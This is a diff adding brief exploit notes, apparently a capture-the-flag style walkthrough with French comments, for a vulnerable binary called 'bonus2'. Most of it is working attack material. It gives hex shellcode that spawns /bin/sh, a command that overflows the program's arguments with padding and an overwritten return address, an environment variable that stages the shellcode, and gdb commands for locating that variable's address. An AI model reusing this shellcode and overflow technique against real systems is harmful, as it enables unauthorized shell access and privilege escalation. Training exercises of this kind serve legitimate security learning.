@@ -1,0 +1,17 @@
+./bonus2 $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\90"*10') $(python -c 'print "A"*23 + "\xbf\xff\xf5\xde"[::-1] + "A"*50')
+
+export LANG=nl
+
+export SHELLCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+mais arg1 juste padding
+arg2 23 padding et adresse d'une variable exploit env qui a le shell ci-dessus
+
+gdb ./bonus2
+b *main
+r
+x/30s *((char **)environ)
+0xbffff8d3:	 "SHELLCODE=...
+
+on recupere ladresse de la variable d env SHELLCODE
+
